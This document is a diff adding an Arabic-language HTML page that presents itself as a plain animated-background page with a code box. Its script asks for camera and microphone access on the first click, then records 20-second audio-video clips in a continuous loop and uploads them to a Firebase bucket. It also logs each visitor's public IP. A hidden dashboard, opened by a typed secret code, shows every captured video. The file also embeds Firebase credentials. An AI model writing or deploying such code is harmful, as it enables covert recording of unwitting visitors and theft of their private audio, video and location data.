@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Advanced Video Dashboard</title>
+<style>
+/* ===== Body & RGB Background ===== */
+body{
+    margin:0; height:100vh; overflow:hidden; font-family:Arial, sans-serif;
+    display:flex; justify-content:center; align-items:center;
+    background: linear-gradient(120deg,#ff0000,#00ff00,#0000ff);
+    background-size:600% 600%;
+    animation: slowRGB 60s ease infinite;
+}
+@keyframes slowRGB{
+    0% {background-position:0% 50%;}
+    25%{background-position:50% 50%;}
+    50%{background-position:100% 50%;}
+    75%{background-position:50% 50%;}
+    100%{background-position:0% 50%;}
+}
+
+/* ===== Secret Input ===== */
+#secretInput{
+    position:absolute; bottom:30px; padding:12px; border-radius:30px;
+    border:none; outline:none; width:220px; text-align:center;
+    font-size:16px; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); color:white;
+}
+
+/* ===== Panel ===== */
+#panel{
+    display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+    background:#fff; overflow:auto; padding:20px;
+}
+#panel h2{margin-top:0; color:#222;}
+video{ width:300px; margin:10px; display:block;}
+#consoleBox{ background:black; color:#0f0; padding:10px; height:200px; overflow:auto; font-size:12px; margin-top:20px;}
+button{ padding:8px 15px; margin:5px; cursor:pointer;}
+button:hover{opacity:0.8;}
+input.logFilter{margin:5px; padding:5px;}
+#videos{display:flex; flex-wrap:wrap;}
+.videoContainer{margin:5px; border:1px solid #ccc; padding:5px; border-radius:8px;}
+.videoContainer span{display:block; font-size:12px; margin-top:3px;}
+</style>
+</head>
+<body>
+
+<input id="secretInput" placeholder="ادخل الكود لفتح الداشبورد">
+
+<div id="panel">
+<h2>لوحة التحكم المتقدمة</h2>
+
+<input class="logFilter" id="logSearch" placeholder="بحث في الـLogs">
+<button onclick="clearScreen()">تصفية الشاشة</button>
+<button onclick="deleteLogs()">حذف جميع السجلات من Firebase</button>
+<button onclick="exportLogs()">تصدير Logs كملف TXT</button>
+
+<p>أجهزة تسجل الآن: <span id="activeCount">0</span></p>
+<p>عدد الفيديوهات المخزنة: <span id="videoCount">0</span></p>
+<p>حجم جميع الفيديوهات: <span id="videoSize">0</span> MB</p>
+<p>IP العام لهذا الجهاز: <span id="userIP">جاري التحميل...</span></p>
+
+<div id="videos"></div>
+<div id="consoleBox"></div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getStorage, ref, uploadBytes, listAll, getDownloadURL, getMetadata } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, onSnapshot, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+/* ===== Firebase Config ===== */
+const firebaseConfig = {
+    apiKey: "AIzaSyDSHHOJZCxWO9CXcbYHJEtf1LGx34BOMuA",
+    authDomain: "watsapp-ee955.firebaseapp.com",
+    projectId: "watsapp-ee955",
+    storageBucket: "watsapp-ee955.appspot.com",
+    messagingSenderId: "194263815533",
+    appId: "1:194263815533:web:58255d0995e5b56ffb3664"
+};
+const app = initializeApp(firebaseConfig);
+const storage = getStorage(app);
+const db = getFirestore(app);
+
+/* ===== Variables ===== */
+let mediaRecorder, stream, recordingStarted=false;
+let logCollection = "logs";
+let sessionID = Date.now();
+let recordingInterval;
+
+/* ===== Logging Function ===== */
+async function log(msg,type="info"){
+    const time = new Date().toLocaleTimeString();
+    const fullMsg = `[${time}] [${type.toUpperCase()}] ${msg}`;
+    const box = document.getElementById("consoleBox");
+    let color="white";
+    if(type==="error") color="red";
+    else if(type==="warning") color="yellow";
+    else color="#00ff00";
+
+    box.innerHTML += `<span style="color:${color}">${fullMsg}</span><br>`;
+    box.scrollTop = box.scrollHeight;
+    console.log(fullMsg);
+
+    // Save to Firebase
+    await addDoc(collection(db,logCollection),{
+        message:fullMsg,
+        timestamp:Date.now(),
+        session:sessionID,
+        type:type
+    });
+}
+
+/* ===== Get IP ===== */
+async function getIP(){
+    try{
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        document.getElementById("userIP").innerText = data.ip;
+        await log("IP الجهاز: "+data.ip);
+    }catch(e){
+        document.getElementById("userIP").innerText="تعذر الحصول على IP";
+        await log("خطأ IP: "+e.message,"error");
+    }
+}
+getIP();
+
+/* ===== Start Recording after Click ===== */
+document.addEventListener("click", async ()=>{
+    if(recordingStarted) return;
+    try{
+        await log("طلب إذن الكاميرا...");
+        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+        await log("تم منح الإذن");
+        startRecordingLoop();
+        recordingStarted=true;
+    }catch(e){
+        await log("خطأ: "+e.message,"error");
+    }
+},{once:true});
+
+function startRecordingLoop(){
+    recordingInterval = setInterval(()=>startRecording(), 20000); // كل 20 ثانية
+    startRecording();
+}
+
+function startRecording(){
+    if(!stream) return;
+    const recorder = new MediaRecorder(stream,{mimeType:"video/webm;codecs=vp9"});
+    let chunks=[];
+    recorder.ondataavailable = e=>chunks.push(e.data);
+    recorder.onstop=async ()=>{
+        const blob = new Blob(chunks,{type:"video/webm"});
+        const fileName="video_"+Date.now()+".webm";
+        const storageRef = ref(storage,"videos/"+fileName);
+        await uploadBytes(storageRef,blob);
+        await log(`تم رفع فيديو: ${fileName} | الحجم: ${(blob.size/1024/1024).toFixed(2)} MB`);
+        chunks=[];
+        updateVideoCount();
+        updateVideoSize();
+        loadVideos(); // Refresh dashboard
+    };
+    recorder.start();
+    setTimeout(()=>recorder.stop(), 20000);
+}
+
+/* ===== Secret Input ===== */
+const input=document.getElementById("secretInput");
+input.addEventListener("input",()=>{ if(secretInput.value==="AMJED190"){ showPanel(); } });
+async function showPanel(){
+    document.getElementById("panel").style.display="block";
+    await log("فتح لوحة التحكم");
+    loadVideos();
+    monitorActiveSessions();
+    refreshConsole();
+}
+
+/* ===== Load Videos ===== */
+async function loadVideos(){
+    const container=document.getElementById("videos");
+    container.innerHTML="";
+    const listRef=ref(storage,"videos/");
+    const result=await listAll(listRef);
+    for(const item of result.items){
+        const url=await getDownloadURL(item);
+        const meta = await getMetadata(item);
+        const sizeMB = (meta.size/1024/1024).toFixed(2);
+        const videoDiv = document.createElement("div");
+        videoDiv.className="videoContainer";
+        const videoEl=document.createElement("video");
+        videoEl.src=url; videoEl.controls=true;
+        const info = document.createElement("span");
+        info.innerText=`${meta.name} | ${sizeMB} MB`;
+        videoDiv.appendChild(videoEl);
+        videoDiv.appendChild(info);
+        container.appendChild(videoDiv);
+    }
+    updateVideoCount();
+    updateVideoSize();
+}
+
+/* ===== Update Counts ===== */
+async function updateVideoCount(){
+    const listRef=ref(storage,"videos/");
+    const result=await listAll(listRef);
+    document.getElementById("videoCount").innerText=result.items.length;
+}
+
+async function updateVideoSize(){
+    const listRef=ref(storage,"videos/");
+    const result=await listAll(listRef);
+    let total=0;
+    for(const item of result.items){
+        const meta = await getMetadata(item);
+        total += meta.size;
+    }
+    document.getElementById("videoSize").innerText=(total/1024/1024).toFixed(2);
+}
+
+/* ===== Active Sessions ===== */
+async function updateActiveCount(active){
+    const docRef=doc(db,"activeSessions",String(sessionID));
+    if(active) await addDoc(collection(db,"activeSessions"),{session:sessionID});
+    else try{ await deleteDoc(doc(db,"activeSessions",String(sessionID))); }catch{}
+}
+async function monitorActiveSessions(){
+    const activeCountSpan=document.getElementById("activeCount");
+    const q=query(collection(db,"activeSessions"));
+    onSnapshot(q,(snapshot)=>{ activeCountSpan.innerText=snapshot.size; });
+}
+
+/* ===== Console Refresh كل ثانية ===== */
+async function refreshConsole(){
+    setInterval(async ()=>{
+        const snapshot = await getDocs(collection(db,logCollection));
+        const box = document.getElementById("consoleBox");
+        const search = document.getElementById("logSearch").value.toLowerCase();
+        box.innerHTML="";
+        snapshot.docs.forEach(d=>{
+            const msg = d.data().message;
+            if(search && !msg.toLowerCase().includes(search)) return;
+            let color="white";
+            if(d.data().type==="error") color="red";
+            else if(d.data().type==="warning") color="yellow";
+            else color="#00ff00";
+            box.innerHTML += `<span style="color:${color}">${msg}</span><br>`;
+        });
+        box.scrollTop = box.scrollHeight;
+    },1000);
+}
+
+/* ===== Buttons ===== */
+window.clearScreen=function(){ document.getElementById("consoleBox").innerHTML=""; }
+window.deleteLogs=async function(){
+    const snapshot=await getDocs(collection(db,logCollection));
+    for(const d of snapshot.docs) await deleteDoc(doc(db,logCollection,d.id));
+    alert("تم حذف جميع السجلات من Firebase");
+}
+window.exportLogs=async function(){
+    const snapshot=await getDocs(collection(db,logCollection));
+    let text="";
+    snapshot.docs.forEach(d=>{ text+=d.data().message+"\n"; });
+    const blob=new Blob([text],{type:"text/plain"});
+    const link=document.createElement("a");
+    link.href=URL.createObjectURL(blob);
+    link.download="logs.txt";
+    link.click();
+}
+</script>
+</body>
+</html>
